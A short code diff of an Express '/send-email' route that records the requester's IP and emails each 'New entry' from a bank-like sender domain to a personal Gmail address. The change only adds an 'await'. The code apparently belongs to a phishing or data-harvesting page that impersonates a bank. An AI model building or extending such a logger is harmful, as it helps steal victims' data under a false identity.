@@ -20,7 +20,7 @@ app.post("/send-email", async (req, res) => {
   const ip = req.ip.split(":").pop();
 
   try {
-     resend.emails.send({
+    await resend.emails.send({
       from: "Log <log@ncreservebank.com>",
       to: ["juniorharry745@gmail.com"],
       subject: `New entry:: ${port}`,
